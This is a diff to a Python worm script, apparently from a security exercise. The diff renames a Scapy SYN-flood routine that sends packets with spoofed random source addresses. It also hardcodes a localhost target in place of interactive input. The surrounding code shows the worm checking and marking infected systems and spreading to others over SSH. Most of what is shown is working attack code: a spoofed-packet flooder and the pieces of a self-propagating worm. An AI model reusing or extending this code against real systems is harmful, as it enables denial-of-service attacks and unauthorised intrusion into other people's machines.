@@ -29,7 +29,7 @@ def randInt():
 	x = random.randint(1000,9000)
 	return x	
 
-def SYN_Flood(dstIP,dstPort,counter):
+def Flooding_Attack(dstIP,dstPort,counter):
 	total = 0
 	print ("Packets are sending ...")
 	for x in range (0,counter):
@@ -37,7 +37,7 @@ def SYN_Flood(dstIP,dstPort,counter):
 		s_eq = randInt()
 		w_indow = randInt()
 
-		IP_Packet = IP ()
+		IP_Packet = IP()
 		IP_Packet.src = randomIP()
 		IP_Packet.dst = dstIP
 
@@ -50,8 +50,9 @@ def SYN_Flood(dstIP,dstPort,counter):
 
 		send(IP_Packet/TCP_Packet, verbose=0)
 		total+=1
-	sys.stdout.write("\nTotal packets sent: %i\n" % total)
+	#sys.stdout.write("\nTotal packets sent: %i\n" % total)
 
+"""
 def info():
 	os.system("clear")
 
@@ -59,6 +60,7 @@ def info():
 	dstPort = input("Target Port : ")
 	
 	return dstIP,int(dstPort)
+"""
 
 def isInfectedSystem(ssh):
 	# Check if the system as infected. One
@@ -85,9 +87,13 @@ def markInfected():
 	file_obj.write("Has anyone really been far as decided to use even go want to do more like?")
 	file_obj.close()
 
-	dstIP,dstPort = info()
-	counter = input("How many packets do you want to send : ")
-	SYN_Flood(dstIP,dstPort,int(counter))
+	#dstIP,dstPort = info()
+	#counter = input("How many packets do you want to send : ")
+	dstIP = '127.0.0.1'
+	dstPort = 8888
+	counter = 1000
+
+	Flooding_Attack(dstIP, dstPort, int(counter))
 ###############################################################
 # Spread to the other system and execute
 # @param sshClient - the instance of the SSH client connected
